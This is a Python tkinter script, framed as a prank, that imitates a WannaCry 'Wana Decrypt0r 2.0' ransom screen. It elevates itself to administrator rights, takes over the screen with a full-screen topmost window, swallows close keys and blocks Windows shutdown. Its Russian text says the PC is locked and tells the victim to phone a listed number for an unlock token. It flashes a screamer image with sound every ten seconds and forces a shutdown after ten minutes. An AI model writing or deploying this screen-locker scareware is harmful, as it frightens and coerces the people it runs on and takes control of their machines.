import tkinter as tk
import time
import sys
import os
import io
import ctypes
import subprocess
from ctypes import wintypes
from datetime import datetime, timedelta

from PIL import Image, ImageTk

try:
    import pygame
    pygame.mixer.init()
    PYGAME_OK = True
except Exception:
    PYGAME_OK = False

PASSWORD = "mega-hayr"
IS_WINDOWS = sys.platform == "win32"
DEBUG = False

C_BANNER     = "#C00000"
C_BANNER_FG  = "#FFFFFF"
C_LEFT_BG    = "#A00000"
C_LEFT_BTN   = "#7A0000"
C_LEFT_FG    = "#FFFFFF"
C_RIGHT_BG   = "#FFFFFF"
C_RIGHT_HEAD = "#C00000"
C_RIGHT_BODY = "#222222"
C_BOTTOM_BG  = "#C00000"
C_YELLOW     = "#FFEE00"

FONT_UI     = ("Segoe UI", 10)
FONT_UI_B   = ("Segoe UI", 10, "bold")
FONT_BANNER = ("Segoe UI", 14, "bold")
FONT_TIMER  = ("Consolas", 15, "bold")

AUTO_SHUTDOWN_SECONDS = 600
SCREAMER_INTERVAL_MS  = 10000
SCREAMER_DURATION_MS  = 2000


def log(*args):
    if sys.stdout is None:
        return
    try:
        print(*args)
    except Exception:
        pass


def resource_path(relative):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative)
    if getattr(sys, "frozen", False):
        base = os.path.dirname(sys.executable)
    else:
        base = os.path.dirname(os.path.abspath(sys.argv[0]))
    return os.path.join(base, relative)


def is_admin():
    if not IS_WINDOWS:
        return True
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def relaunch_as_admin():
    if not IS_WINDOWS:
        return False
    try:
        if getattr(sys, "frozen", False):
            exe = sys.executable
            params = " ".join(f'"{a}"' for a in sys.argv[1:])
        else:
            exe = sys.executable
            script = os.path.abspath(sys.argv[0])
            params = f'"{script}"'
            if len(sys.argv) > 1:
                params += " " + " ".join(f'"{a}"' for a in sys.argv[1:])
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", exe, params, None, 1
        )
        return result > 32
    except Exception as e:
        log("relaunch_as_admin failed:", e)
        return False


if IS_WINDOWS:
    user32 = ctypes.windll.user32
    user32.ShutdownBlockReasonCreate.argtypes = [wintypes.HWND, wintypes.LPCWSTR]
    user32.ShutdownBlockReasonCreate.restype = wintypes.BOOL
    user32.ShutdownBlockReasonDestroy.argtypes = [wintypes.HWND]
    user32.ShutdownBlockReasonDestroy.restype = wintypes.BOOL

    def block_shutdown(hwnd, reason="Prank in progress..."):
        try: user32.ShutdownBlockReasonCreate(hwnd, reason)
        except Exception: pass

    def unblock_shutdown(hwnd):
        try: user32.ShutdownBlockReasonDestroy(hwnd)
        except Exception: pass
else:
    def block_shutdown(hwnd, reason=""): pass
    def unblock_shutdown(hwnd): pass


def load_lock_image(max_side=170):
    for name in ("lock.jpg", "lock.jpeg", "lock.png"):
        path = resource_path(name)
        if os.path.exists(path):
            try:
                with open(path, "rb") as f:
                    data = f.read()
                img = Image.open(io.BytesIO(data))
                if img.mode in ("RGBA", "LA", "P"):
                    img = img.convert("RGBA")
                    bg = Image.new("RGBA", img.size, (255, 255, 255, 255))
                    bg.paste(img, (0, 0), img)
                    img = bg.convert("RGB")
                else:
                    img = img.convert("RGB")
                img.thumbnail((max_side, max_side), Image.LANCZOS)
                log(f"[lock] загружено: {name} → {img.width}x{img.height}")
                return ImageTk.PhotoImage(img)
            except Exception as e:
                log(f"[lock] ошибка на {name}: {e}")
    log("[lock] lock.* не найдены")
    return None


def create_prank_window():
    root = tk.Tk()
    root.title("Wana Decrypt0r 2.0")
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.configure(bg="black")

    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()
    root.geometry(f"{sw}x{sh}+0+0")

    root.update_idletasks()
    hwnd = root.winfo_id()
    block_shutdown(hwnd, "Prank in progress. Don't turn me off :)")

    def show_screamer():
        try:
            if PYGAME_OK:
                for snd_name in ("scary_very.mp3", "scary_very.wav", "scary_very.ogg"):
                    snd_path = resource_path(snd_name)
                    if os.path.exists(snd_path):
                        try:
                            pygame.mixer.music.load(snd_path)
                            pygame.mixer.music.play()
                        except Exception as e:
                            log("[screamer] sound error:", e)
                        break
                else:
                    log("[screamer] scary_very.* не найден")

            path = None
            for name in ("screamer.jpg", "screamer.jpeg", "screamer.png"):
                p = resource_path(name)
                if os.path.exists(p):
                    path = p
                    break
            if path is None:
                log("[screamer] картинка не найдена")
                return

            with open(path, "rb") as f:
                data = f.read()
            img = Image.open(io.BytesIO(data)).convert("RGB")
            scr_w = root.winfo_screenwidth()
            scr_h = root.winfo_screenheight()
            img = img.resize((scr_w, scr_h), Image.LANCZOS)
            photo = ImageTk.PhotoImage(img)

            top = tk.Toplevel(root)
            top.overrideredirect(True)
            top.attributes("-topmost", True)
            top.geometry(f"{scr_w}x{scr_h}+0+0")
            top.configure(bg="black")

            lbl = tk.Label(top, image=photo, bg="black", bd=0)
            lbl.image = photo
            lbl.pack(fill="both", expand=True)

            top.lift()
            top.focus_force()
            top.after(SCREAMER_DURATION_MS, top.destroy)
        except Exception as e:
            log("[screamer] ошибка:", e)

    def schedule_screamer():
        try:
            if not prank_frame.winfo_ismapped():
                root.after(1000, schedule_screamer)
                return
        except Exception:
            pass
        show_screamer()
        root.after(SCREAMER_INTERVAL_MS, schedule_screamer)

    timer_label = tk.Label(
        root, text="2.0",
        font=("Courier New", 150, "bold"),
        fg="#FF0000", bg="black"
    )
    timer_label.pack(expand=True)

    prank_frame = tk.Frame(root, bg=C_BOTTOM_BG)

    titlebar = tk.Frame(prank_frame, height=30, bg="#4A74A8")
    titlebar.pack(fill="x", side="top")
    titlebar.pack_propagate(False)

    tb_canvas = tk.Canvas(titlebar, highlightthickness=0, bd=0, bg="#4A74A8")
    tb_canvas.place(x=0, y=0, relwidth=1, relheight=1)

    _btn_boxes = {"close": None, "max": None, "min": None}

    def draw_titlebar(event=None):
        tb_canvas.delete("all")
        w = tb_canvas.winfo_width() or 900
        h = 30
        for y in range(h):
            t = y / (h - 1)
            r = int(0xDD + (0x4A - 0xDD) * t)
            g = int(0xEB + (0x74 - 0xEB) * t)
            b = int(0xF7 + (0xA8 - 0xF7) * t)
            tb_canvas.create_line(0, y, w, y, fill=f"#{r:02x}{g:02x}{b:02x}")
        tb_canvas.create_line(0, 0, w, 0, fill="#F5FAFF")
        tb_canvas.create_line(0, h-1, w, h-1, fill="#1A3A6A")
        tb_canvas.create_text(14, h // 2, text="Wana Decrypt0r 2.0",
                              anchor="w", font=("Segoe UI", 10, "bold"),
                              fill="#FFFFFF")

        bw, bh = 29, 21
        by = (h - bh) // 2
        x_close = w - bw - 2
        x_max = x_close - bw - 1
        x_min = x_max - bw - 1

        tb_canvas.create_rectangle(x_min, by, x_min + bw, by + bh,
                                   fill="#5A84B8", outline="#3A5A8A")
        tb_canvas.create_line(x_min + 9, by + bh - 6, x_min + bw - 9, by + bh - 6,
                              fill="#FFFFFF", width=2)

        tb_canvas.create_rectangle(x_max, by, x_max + bw, by + bh,
                                   fill="#5A84B8", outline="#3A5A8A")
        tb_canvas.create_rectangle(x_max + 9, by + 6, x_max + bw - 9, by + bh - 6,
                                   outline="#FFFFFF", width=1)

        tb_canvas.create_rectangle(x_close, by, x_close + bw, by + bh,
                                   fill="#C0504D", outline="#7A2A2A")
        tb_canvas.create_line(x_close + 9, by + 6, x_close + bw - 9, by + bh - 6,
                              fill="#FFFFFF", width=2)
        tb_canvas.create_line(x_close + 9, by + bh - 6, x_close + bw - 9, by + 6,
                              fill="#FFFFFF", width=2)

        _btn_boxes["min"] = (x_min, by, x_min + bw, by + bh)
        _btn_boxes["max"] = (x_max, by, x_max + bw, by + bh)
        _btn_boxes["close"] = (x_close, by, x_close + bw, by + bh)

    tb_canvas.bind("<Configure>", draw_titlebar)

    _drag = {"x": 0, "y": 0, "on": False}

    def _in(box, x, y):
        return box and box[0] <= x <= box[2] and box[1] <= y <= box[3]

    def tb_press(event):
        x, y = event.x, event.y
        if _in(_btn_boxes["close"], x, y):
            hint_label.config(text="Сначала введи токен :)")
            _drag["on"] = False
            return
        if _in(_btn_boxes["max"], x, y) or _in(_btn_boxes["min"], x, y):
            _drag["on"] = False
            return
        _drag["x"] = event.x
        _drag["y"] = event.y
        _drag["on"] = True

    def tb_motion(event):
        if _drag["on"]:
            dx = event.x - _drag["x"]
            dy = event.y - _drag["y"]
            root.geometry(f"+{root.winfo_x() + dx}+{root.winfo_y() + dy}")

    tb_canvas.bind("<Button-1>", tb_press)
    tb_canvas.bind("<B1-Motion>", tb_motion)

    banner = tk.Frame(prank_frame, bg=C_BANNER, height=42)
    banner.pack(fill="x", side="top")
    banner.pack_propagate(False)
    tk.Label(
        banner,
        text="Ooops, your files have been locked!  wheretoken_smile",
        font=FONT_BANNER, fg=C_BANNER_FG, bg=C_BANNER
    ).pack(pady=10)

    hint_label = tk.Label(
        prank_frame, text="", font=FONT_UI,
        fg=C_YELLOW, bg=C_BOTTOM_BG
    )
    hint_label.pack(side="bottom", pady=3)

    btc_bar = tk.Frame(prank_frame, bg=C_BOTTOM_BG)
    btc_bar.pack(fill="x", side="bottom")

    tk.Label(
        btc_bar, text="Send token to unlock your PC:",
        font=FONT_UI_B, fg="#FFFFFF", bg=C_BOTTOM_BG
    ).pack(anchor="w", padx=15, pady=(8, 2))

    entry_row = tk.Frame(btc_bar, bg=C_BOTTOM_BG)
    entry_row.pack(fill="x", padx=15, pady=(0, 8))

    entry = tk.Entry(
        entry_row, font=("Consolas", 12),
        bg="#FFFFFF", fg="#000000",
        relief="flat", insertbackground="#000000"
    )
    entry.pack(side="left", fill="x", expand=True, ipady=5)

    check_btn = tk.Button(
        entry_row, text="CHECK",
        font=FONT_UI_B, fg="#C00000", bg="#FFFFFF",
        activebackground="#EEEEEE", activeforeground="#C00000",
        relief="flat", padx=20, pady=2, cursor="hand2"
    )
    check_btn.pack(side="left", padx=(8, 0))

    main = tk.Frame(prank_frame, bg=C_RIGHT_BG)
    main.pack(fill="both", expand=True)

    left = tk.Frame(main, bg=C_LEFT_BG, width=250)
    left.pack(side="left", fill="y")
    left.pack_propagate(False)

    outer_frame = tk.Frame(left, bg=C_LEFT_BG)
    outer_frame.pack(pady=(20, 12))

    framed = tk.Frame(outer_frame, bg="#FFFFFF",
                      highlightbackground="#FFFFFF",
                      highlightcolor="#FFFFFF",
                      highlightthickness=3)
    framed.pack()

    lock_box = tk.Frame(framed, bg="#FFFFFF", width=170, height=170)
    lock_box.pack()
    lock_box.pack_propagate(False)

    photo = load_lock_image(max_side=170)
    if photo is not None:
        img_lbl = tk.Label(lock_box, image=photo, bg="#FFFFFF")
        img_lbl.image = photo
        img_lbl.pack(expand=True)
    else:
        tk.Label(lock_box, text="🔒", font=("Segoe UI Symbol", 48),
                 fg=C_LEFT_BG, bg="#FFFFFF").pack(expand=True)

    tk.Label(left, text="Your PC will be turned off on",
             font=FONT_UI_B, fg=C_LEFT_FG, bg=C_LEFT_BG).pack(pady=(14, 0))

    shutdown_dt = datetime.now() + timedelta(seconds=AUTO_SHUTDOWN_SECONDS)
    tk.Label(left, text=shutdown_dt.strftime("%m/%d/%Y  %H:%M:%S"),
             font=FONT_UI, fg=C_LEFT_FG, bg=C_LEFT_BG).pack()

    tk.Label(left, text="Time Left",
             font=FONT_UI_B, fg=C_LEFT_FG, bg=C_LEFT_BG).pack(pady=(6, 0))

    shutdown_timer_lbl = tk.Label(
        left, text="00:00:00:00",
        font=FONT_TIMER, fg="#FFFFFF", bg=C_LEFT_BTN, padx=10, pady=4
    )
    shutdown_timer_lbl.pack(pady=3)

    right = tk.Frame(main, bg=C_RIGHT_BG)
    right.pack(side="left", fill="both", expand=True)

    scrollbar = tk.Scrollbar(right, orient="vertical")
    scrollbar.pack(side="right", fill="y")

    text = tk.Text(
        right, wrap="word", bg=C_RIGHT_BG, fg=C_RIGHT_BODY,
        font=("Segoe UI", 10), relief="flat", padx=15, pady=10,
        yscrollcommand=scrollbar.set, borderwidth=0, highlightthickness=0
    )
    text.pack(side="left", fill="both", expand=True)
    scrollbar.config(command=text.yview)

    text.tag_configure("head", foreground=C_RIGHT_HEAD,
                       font=("Segoe UI", 12, "bold"),
                       spacing1=8, spacing3=4)
    text.tag_configure("body", foreground=C_RIGHT_BODY,
                       font=("Segoe UI", 10), spacing3=6)

    text.insert("end", "Что случилось с твоим компьютером?\n", "head")
    text.insert("end",
        "Твой компьютер был заблокирован. Доступ к системе временно ограничен. "
        "Ничего не удалено — файлы, документы, фото и всё остальное на месте. "
        "Просто система ждёт, пока ты введёшь токен для снятия блокировки.\n\n",
        "body")
    text.insert("end", "Что значит «заблокирован»?\n", "head")
    text.insert("end",
        "Ограничен доступ к основным функциям ПК. Кнопки «Пуск», панель задач "
        "и другие элементы могут работать некорректно, пока блокировка активна. "
        "Как только ты введёшь правильный токен — всё вернётся в норму.\n\n",
        "body")
    text.insert("end", "Можно ли вернуть доступ?\n", "head")
    text.insert("end",
        "Да. Мы гарантируем полный возврат доступа. Всё что нужно — связаться со мной "
        "и получить персональный токен. Персональный ID этого ПК: wheretoken_smile\n\n",
        "body")
    text.insert("end", "Как получить токен?\n", "head")
    text.insert("end",
        "Напиши или позвони мне на номер 7 988 904 41 30. "
        "После короткого разговора я отправлю тебе токен. "
        "Введи его в поле ниже и нажми CHECK.\n\n",
        "body")
    text.insert("end", "Что будет, если не ввести токен?\n", "head")
    text.insert("end",
        "ПК автоматически выключится через 10 минут. "
        "После включения блокировка сохранится, и отсчёт начнётся заново. "
        "Ничего не удалится — но пользоваться компьютером без токена не получится.\n\n",
        "body")
    text.insert("end", "Что делать прямо сейчас?\n", "head")
    text.insert("end",
        "Не паникуй. Возьми телефон и позвони по номеру 7 988 904 41 30. "
        "Я дам тебе токен, и через 10 секунд всё снова заработает.\n",
        "body")
    text.config(state="disabled")

    for seq in ("<Alt-F4>", "<Escape>", "<Control-w>", "<Control-W>",
                "<Alt-Escape>", "<Super_L>", "<F4>"):
        root.bind_all(seq, lambda e: "break")

    def keep_focus():
        try:
            root.lift()
            root.attributes("-topmost", True)
        except tk.TclError:
            pass
        root.after(500, keep_focus)

    start_time = time.time()
    duration = 2.0
    zero_hold = 1.0

    shutdown_state = {"active": False, "start": 0.0, "triggered": False}

    def trigger_shutdown():
        if shutdown_state["triggered"]:
            return
        shutdown_state["triggered"] = True
        shutdown_timer_lbl.config(text="SHUTDOWN 10s", bg="#FF0000")
        unblock_shutdown(hwnd)
        if IS_WINDOWS:
            try:
                subprocess.Popen(
                    ["shutdown", "/s", "/t", "10", "/c", "Prank shutdown"],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except Exception as e:
                log("shutdown failed:", e)

    def update_shutdown_countdown():
        if not shutdown_state["active"]:
            return
        remaining = AUTO_SHUTDOWN_SECONDS - (time.time() - shutdown_state["start"])
        if remaining <= 0:
            trigger_shutdown()
            return
        d = int(remaining // 86400)
        h = int((remaining % 86400) // 3600)
        m = int((remaining % 3600) // 60)
        s = int(remaining % 60)
        shutdown_timer_lbl.config(text=f"{d:02d}:{h:02d}:{m:02d}:{s:02d}")
        root.after(500, update_shutdown_countdown)

    def show_prank():
        timer_label.pack_forget()
        prank_frame.pack(expand=True, fill="both")

        root.withdraw()
        root.deiconify()

        w, h = 900, 620
        x = (sw - w) // 2
        y = (sh - h) // 2
        root.geometry(f"{w}x{h}+{x}+{y}")

        root.attributes("-topmost", True)
        root.lift()
        root.focus_force()
        entry.focus_force()

        shutdown_state["active"] = True
        shutdown_state["start"] = time.time()
        update_shutdown_countdown()

        root.after(SCREAMER_INTERVAL_MS, schedule_screamer)

    def update_timer():
        remaining = duration - (time.time() - start_time)
        if remaining > 0:
            timer_label.config(text=f"{remaining:.1f}")
            root.after(50, update_timer)
        else:
            timer_label.config(text="0.0")
            root.after(int(zero_hold * 1000), show_prank)

    def check_password(event=None):
        if entry.get().strip() == PASSWORD:
            on_close()
        else:
            hint_label.config(text="Неверный токен. Попробуй ещё раз.")
            entry.delete(0, tk.END)
            entry.focus_force()

    check_btn.config(command=check_password)
    entry.bind("<Return>", check_password)

    def on_close():
        shutdown_state["active"] = False
        unblock_shutdown(hwnd)
        if PYGAME_OK:
            try:
                pygame.mixer.music.stop()
            except Exception:
                pass
        try:
            root.grab_release()
        except tk.TclError:
            pass
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", lambda: None)

    if DEBUG:
        def emergency_exit(event=None):
            on_close()
        root.bind_all("<Control-Shift-KeyPress-Q>", emergency_exit)
        tip = tk.Label(root, text="DEBUG: Ctrl+Shift+Q",
                       font=("Segoe UI", 9), fg="#555", bg="black")
        tip.place(relx=1.0, rely=1.0, anchor="se", x=-5, y=-5)

    try:
        root.grab_set()
    except tk.TclError:
        pass

    root.focus_force()
    keep_focus()
    update_timer()
    root.mainloop()


if __name__ == "__main__":
    if IS_WINDOWS and not is_admin():
        if relaunch_as_admin():
            sys.exit(0)
    create_prank_window()